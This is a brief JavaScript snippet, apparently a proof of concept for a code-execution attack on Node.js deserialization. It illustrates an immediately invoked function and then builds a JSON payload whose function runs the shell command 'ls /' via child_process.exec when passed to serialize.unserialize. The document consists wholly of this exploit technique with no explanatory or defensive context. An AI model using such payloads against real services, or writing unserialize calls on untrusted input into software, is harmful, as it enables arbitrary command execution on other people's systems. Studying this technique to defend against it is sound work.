var f = function() {
  console.log('hello f');
};

var g = function() {
  console.log('hello g');
  return 1;
} ();

var ls_payload = '{"rce":"...function(){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(ls_payload);